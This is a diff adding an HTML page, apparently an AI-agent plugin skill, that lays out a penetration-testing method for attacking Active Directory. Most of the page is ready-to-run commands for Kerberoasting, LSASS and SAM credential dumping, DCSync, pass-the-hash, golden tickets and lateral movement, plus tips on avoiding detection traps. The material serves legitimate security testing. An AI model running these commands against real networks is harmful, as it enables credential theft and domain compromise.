@@ -1,0 +1,354 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>attacking-active-directory — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / attacking-active-directory</div>
+  <h1 class="sk">attacking-active-directory</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Attack and enumerate Active Directory environments using Kerberos attacks (Kerberoasting, ASREPRoasting), credential dumping (DCSync, Mimikatz), lateral movement (PtH, PtT), and BloodHound analysis. Use when pentesting Windows domains or exploiting AD misconfigurations.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><h2>When to Use</h2>
+<ul>
+<li>AD reconnaissance and enumeration</li>
+<li>Kerberos-based attacks</li>
+<li>Credential dumping from domain controllers</li>
+<li>Lateral movement within domains</li>
+<li>BloodHound attack path analysis</li>
+<li>Domain persistence techniques</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Non-Windows / Linux-only environments</strong> — use <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a></li>
+<li><strong>Cracking the hashes you collected</strong> — use <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
+<li><strong>Post-domain-compromise persistence</strong> — use <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
+<li><strong>Entra ID / Azure AD as the primary target</strong> — use <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></li>
+<li><strong>Detecting these attacks defensively</strong> — use <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a></li>
+</ul>
+<p>A privileged, Kerberoastable account with no logon history is a classic honeyuser: roasting it raises a high-fidelity alert. Check <a class="xref" href="recognizing-deception.html"><code>recognizing-deception</code></a> before roasting an account that looks too convenient.</p>
+<h2>Route to a Depth Skill</h2>
+<p>Several AD escalation families are deep enough to have their own procedure skill. When enumeration points at one of these, switch to it — the general methodology here does not carry the tool-specific detail they do.</p>
+<div class="tw"><table><thead><tr><th>Signal</th><th>Skill</th></tr></thead><tbody><tr><td>A CA exists (<code>pKIEnrollmentService</code>), <code>certipy find</code> flags a template, ESC1-ESC16</td><td><a class="xref" href="abusing-adcs.html"><code>abusing-adcs</code></a></td></tr><tr><td>BloodHound flags Unconstrained/Constrained/RBCD delegation, <code>GenericWrite</code> over a computer</td><td><a class="xref" href="attacking-kerberos-delegation.html"><code>attacking-kerberos-delegation</code></a></td></tr><tr><td>The target is Entra ID / Azure AD, tokens, PRTs, or hybrid-identity sync</td><td><a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></td></tr></tbody></table></div>
+<p>The domain methodology below (Kerberoasting, DCSync, lateral movement) still applies; these skills specialize a single step of it and hand back here.</p>
+<h2>Kerberoasting</h2>
+<p><strong>Windows:</strong></p>
+<pre><code># Check kerberoastable users
+.\Rubeus.exe kerberoast /stats
+
+# Roast all
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Target specific user
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.txt
+
+# Target admins only
+.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap</code></pre>
+<p><strong>Linux:</strong></p>
+<pre><code># Impacket GetUserSPNs
+GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile hashes.txt
+
+# With NT hash
+GetUserSPNs.py -request -dc-ip 10.10.10.10 -hashes :ntlmhash domain.local/user -outputfile hashes.txt
+
+# Target specific user
+GetUserSPNs.py -request-user svc_mssql -dc-ip 10.10.10.10 domain.local/user:password</code></pre>
+<p><strong>Crack Hashes:</strong></p>
+<pre><code># Hashcat (TGS-REP)
+hashcat -m 13100 hashes.txt wordlist.txt
+
+# John
+john --wordlist=wordlist.txt hashes.txt</code></pre>
+<h2>ASREPRoasting</h2>
+<p><strong>Windows:</strong></p>
+<pre><code># Enumerate vulnerable users
+Get-DomainUser -PreauthNotRequired
+
+# Roast
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+.\Rubeus.exe asreproast /user:victim /format:hashcat</code></pre>
+<p><strong>Linux:</strong></p>
+<pre><code># With domain creds
+GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile hashes.txt
+
+# Without creds (username list)
+GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.10</code></pre>
+<p><strong>Crack AS-REP:</strong></p>
+<pre><code>hashcat -m 18200 hashes.txt wordlist.txt</code></pre>
+<h2>BloodHound</h2>
+<p><strong>Data Collection:</strong></p>
+<pre><code># Windows - SharpHound
+.\SharpHound.exe -c All --zipfilename output.zip
+.\SharpHound.exe -c All,GPOLocalGroup</code></pre>
+<p><strong>Linux:</strong></p>
+<pre><code># bloodhound-python
+bloodhound-python -u user -p password -ns 10.10.10.10 -d domain.local -c All --zip</code></pre>
+<p><strong>Useful Queries:</strong></p>
+<pre><code># Shortest path to Domain Admins
+MATCH p=shortestPath((n)-[*1..]-&gt;(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
+
+# Kerberoastable users
+MATCH (u:User {hasspn:true}) RETURN u
+
+# AS-REP Roastable
+MATCH (u:User {dontreqpreauth:true}) RETURN u
+
+# Unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+
+# DCSync rights
+MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]-&gt;(d:Domain) RETURN p</code></pre>
+<h2>Credential Dumping</h2>
+<p><strong>LSASS Dumping:</strong></p>
+<pre><code># Task Manager: Right-click lsass.exe -&gt; Create dump file
+
+# procdump
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# comsvcs.dll
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\Temp\lsass.dmp full
+
+# Parse offline with mimikatz
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords</code></pre>
+<p><strong>SAM Dumping:</strong></p>
+<pre><code># Save hives
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+
+# Extract hashes (Linux)
+secretsdump.py -sam sam.hive -system system.hive LOCAL</code></pre>
+<p><strong>DCSync (Domain):</strong></p>
+<pre><code># secretsdump - dump all
+secretsdump.py domain.local/user:password@dc.domain.local -just-dc
+
+# Specific user
+secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user krbtgt
+
+# With NTLM hash
+secretsdump.py -hashes :ntlmhash domain.local/user@dc.domain.local -just-dc</code></pre>
+<h2>Pass-the-Hash</h2>
+<p><strong>Windows:</strong></p>
+<pre><code># Mimikatz
+sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe</code></pre>
+<p><strong>Linux:</strong></p>
+<pre><code># NetExec (nxc)
+nxc smb 10.10.10.10 -u administrator -H hash
+nxc smb 10.10.10.10 -u administrator -H hash -x whoami
+
+# psexec
+psexec.py -hashes :hash administrator@10.10.10.10
+
+# wmiexec
+wmiexec.py -hashes :hash administrator@10.10.10.10
+
+# evil-winrm
+evil-winrm -i 10.10.10.10 -u administrator -H hash</code></pre>
+<h2>Pass-the-Ticket</h2>
+<p><strong>Export Tickets:</strong></p>
+<pre><code># Mimikatz
+sekurlsa::tickets /export
+
+# Rubeus
+.\Rubeus.exe dump /nowrap
+.\Rubeus.exe monitor /interval:10</code></pre>
+<p><strong>Import/Use Tickets:</strong></p>
+<pre><code># Mimikatz
+kerberos::ptt ticket.kirbi
+
+# Rubeus
+.\Rubeus.exe ptt /ticket:base64ticket
+
+# Verify
+klist</code></pre>
+<p><strong>Linux PtT:</strong></p>
+<pre><code># Convert kirbi to ccache
+ticketConverter.py ticket.kirbi ticket.ccache
+
+# Set ticket
+export KRB5CCNAME=ticket.ccache
+
+# Use ticket
+psexec.py -k -no-pass domain.local/administrator@dc.domain.local</code></pre>
+<h2>Overpass-the-Hash</h2>
+<pre><code># Rubeus - request TGT with NTLM hash
+.\Rubeus.exe asktgt /user:administrator /domain:domain.local /rc4:hash /ptt
+
+# With AES key (better OPSEC)
+.\Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:key /ptt</code></pre>
+<h2>Golden/Silver Tickets</h2>
+<p><strong>Golden Ticket (TGT):</strong></p>
+<pre><code># Requirements: krbtgt hash, Domain SID
+
+# Mimikatz
+kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt
+
+# Rubeus
+.\Rubeus.exe golden /rc4:hash /user:administrator /domain:domain.local /sid:S-1-5-21-... /ptt</code></pre>
+<p><strong>Silver Ticket (TGS):</strong></p>
+<pre><code># Requirements: Service account hash, Service SPN
+
+# Mimikatz - CIFS service
+kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt</code></pre>
+<h2>Lateral Movement</h2>
+<p><strong>NetExec (nxc):</strong></p>
+<pre><code># SMB spray
+nxc smb 10.10.10.0/24 -u user -p password
+
+# Execute commands
+nxc smb 10.10.10.10 -u admin -p password -x whoami
+nxc smb 10.10.10.10 -u admin -H hash -x whoami
+
+# Dump SAM
+nxc smb 10.10.10.10 -u admin -p password --sam
+
+# Dump LSA
+nxc smb 10.10.10.10 -u admin -p password --lsa</code></pre>
+<p><strong>PSExec Variants:</strong></p>
+<pre><code># psexec
+psexec.py domain/user:password@10.10.10.10
+
+# wmiexec (stealthier)
+wmiexec.py domain/user:password@10.10.10.10
+
+# smbexec (no service)
+smbexec.py domain/user:password@10.10.10.10</code></pre>
+<p><strong>WinRM:</strong></p>
+<pre><code># PowerShell
+Enter-PSSession -ComputerName dc.domain.local -Credential domain\user</code></pre>
+<pre><code># evil-winrm
+evil-winrm -i 10.10.10.10 -u administrator -p password
+evil-winrm -i 10.10.10.10 -u administrator -H hash</code></pre>
+<h2>Enumeration</h2>
+<p><strong>Domain Info:</strong></p>
+<pre><code># PowerView
+Get-Domain
+Get-DomainController
+Get-DomainUser
+Get-DomainComputer
+Get-DomainGroup
+Get-DomainGroupMember "Domain Admins"</code></pre>
+<p><strong>Linux Enumeration:</strong></p>
+<pre><code># NetExec (nxc, formerly CrackMapExec)
+nxc smb 10.10.10.0/24 -u user -p password --users
+nxc smb 10.10.10.0/24 -u user -p password --groups
+
+# ldapsearch
+ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"</code></pre>
+<h2>Quick Workflow</h2>
+<ol>
+<li><strong>Initial Access</strong> → Get domain credentials</li>
+<li><strong>Enumeration</strong> → Run BloodHound collection</li>
+<li><strong>Kerberoasting</strong> → Extract and crack service tickets</li>
+<li><strong>Lateral Movement</strong> → Use creds to move to high-value targets</li>
+<li><strong>Credential Dumping</strong> → Dump LSASS/SAM on compromised hosts</li>
+<li><strong>DCSync</strong> → Extract all domain hashes from DC</li>
+<li><strong>Persistence</strong> → Golden ticket or create backdoor accounts</li>
+</ol>
+<h2>Common Wins</h2>
+<ul>
+<li>Kerberoasting weak service account passwords</li>
+<li>ASREPRoasting accounts without preauth</li>
+<li>BloodHound finding short paths to DA</li>
+<li>Pass-the-Hash from dumped credentials</li>
+<li>DCSync with compromised accounts that have replication rights</li>
+</ul>
+<h2>Tools</h2>
+<ul>
+<li><strong>Rubeus</strong> - Kerberos attacks (Windows)</li>
+<li><strong>Mimikatz</strong> - Credential dumping (Windows)</li>
+<li><strong>Impacket</strong> - Comprehensive toolkit (Linux)</li>
+<li><strong>BloodHound</strong> - AD relationship graphing</li>
+<li><strong>NetExec (nxc)</strong> - Swiss army knife for AD (the maintained successor to the archived CrackMapExec)</li>
+<li><strong>PowerView</strong> - AD enumeration (PowerShell)</li>
+<li><strong>evil-winrm</strong> - WinRM access (Linux)</li>
+</ul>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Initial Access</strong> (TA0001)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1078/">T1078</a> Valid Accounts <em>(also Persistence, Privilege Escalation, Defense Evasion)</em> — see also <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a>, <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a></li>
+</ul>
+<p><strong>Execution</strong> (TA0002)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1047/">T1047</a> Windows Management Instrumentation — see also <a class="xref" href="escalating-windows-privileges.html"><code>escalating-windows-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1569/">T1569</a> System Services — see also <a class="xref" href="escalating-windows-privileges.html"><code>escalating-windows-privileges</code></a></li>
+</ul>
+<p><strong>Persistence</strong> (TA0003)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1098/">T1098</a> Account Manipulation <em>(also Privilege Escalation)</em> — see also <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1136/">T1136</a> Create Account — see also <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1556/">T1556</a> Modify Authentication Process <em>(also Credential Access)</em> — see also <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
+</ul>
+<p><strong>Privilege Escalation</strong> (TA0004)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1484/">T1484</a> Domain or Tenant Policy Modification <em>(also Defense Evasion)</em></li>
+</ul>
+<p><strong>Credential Access</strong> (TA0006)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1003/">T1003</a> OS Credential Dumping — see also <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1003/001/">T1003.001</a> LSASS Memory — see also <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1003/003/">T1003.003</a> NTDS</li>
+<li><a href="https://attack.mitre.org/techniques/T1003/006/">T1003.006</a> DCSync</li>
+<li><a href="https://attack.mitre.org/techniques/T1110/003/">T1110.003</a> Password Spraying — see also <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1557/">T1557</a> Adversary-in-the-Middle <em>(also Collection)</em> — see also <a class="xref" href="attacking-wireless-networks.html"><code>attacking-wireless-networks</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1558/">T1558</a> Steal or Forge Kerberos Tickets — see also <a class="xref" href="attacking-kerberos-delegation.html"><code>attacking-kerberos-delegation</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1558/003/">T1558.003</a> Kerberoasting — see also <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1558/004/">T1558.004</a> AS-REP Roasting</li>
+<li><a href="https://attack.mitre.org/techniques/T1649/">T1649</a> Steal or Forge Authentication Certificates — see also <a class="xref" href="abusing-adcs.html"><code>abusing-adcs</code></a></li>
+</ul>
+<p><strong>Discovery</strong> (TA0007)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1018/">T1018</a> Remote System Discovery — see also <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1069/">T1069</a> Permission Groups Discovery — see also <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1087/">T1087</a> Account Discovery — see also <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a></li>
+</ul>
+<p><strong>Lateral Movement</strong> (TA0008)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1021/">T1021</a> Remote Services — see also <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1021/001/">T1021.001</a> Remote Desktop Protocol</li>
+<li><a href="https://attack.mitre.org/techniques/T1021/002/">T1021.002</a> SMB/Windows Admin Shares — see also <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1021/006/">T1021.006</a> Windows Remote Management</li>
+<li><a href="https://attack.mitre.org/techniques/T1550/">T1550</a> Use Alternate Authentication Material <em>(also Defense Evasion)</em></li>
+<li><a href="https://attack.mitre.org/techniques/T1550/002/">T1550.002</a> Pass the Hash — see also <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1550/003/">T1550.003</a> Pass the Ticket</li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</li>
+<li>https://github.com/fortra/impacket</li>
+<li>https://github.com/GhostPack/Rubeus</li>
+<li>https://github.com/BloodHoundAD/BloodHound</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
